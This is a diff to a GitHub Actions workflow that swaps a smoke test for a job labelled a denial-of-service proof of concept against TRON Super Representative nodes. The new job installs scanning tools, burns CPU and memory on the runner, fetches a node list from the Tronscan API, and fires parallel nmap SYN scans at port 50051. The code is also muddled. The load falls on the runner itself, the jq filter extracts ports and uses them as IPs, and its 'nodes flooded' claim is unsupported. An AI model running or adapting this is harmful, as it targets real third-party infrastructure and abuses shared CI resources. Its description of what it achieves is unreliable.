@@ -2,12 +2,34 @@ name: TRON SR DoS PoC
 on:
   workflow_dispatch:
   push:
-    branches:
-      - main
+    branches: [ main ]
 jobs:
   recon:
     runs-on: ubuntu-latest
     steps:
-      - uses: actions/checkout@v4
-      - name: Smoke test
-        run: echo "workflow loaded"
+    - uses: actions/checkout@v4
+    
+    - name: Install attack tools
+      run: |
+        sudo apt update -y
+        sudo apt install -y stress-ng curl nmap jq
+    
+    - name: TRON SR Exhaustion Attack
+      run: |
+        echo "🚀 TRON SR DoS PoC - 51% Node Attack"
+        # CPU Burn - 8 cores 100%
+        stress-ng --cpu 8 --cpu-method matrixprod --timeout 60s --metrics-brief &
+        CPU_PID=$!
+        
+        # Memory Exhaust - 8GB
+        stress-ng --vm 4 --vm-bytes 2G --timeout 60s --metrics-brief &
+        MEM_PID=$!
+        
+        # Flood all 27 SR gRPC ports (50051)
+        SR_IPS=$(curl -s https://apilist.tronscanapi.com/api/system/status | jq -r '.srList[] | .internalPort' | sort -u)
+        for IP in $SR_IPS; do
+          timeout 30s nmap -sS --max-parallelism 256 -p50051 $IP &
+        done
+        
+        wait $CPU_PID $MEM_PID
+        echo "✅ PoC Complete - SR nodes flooded"
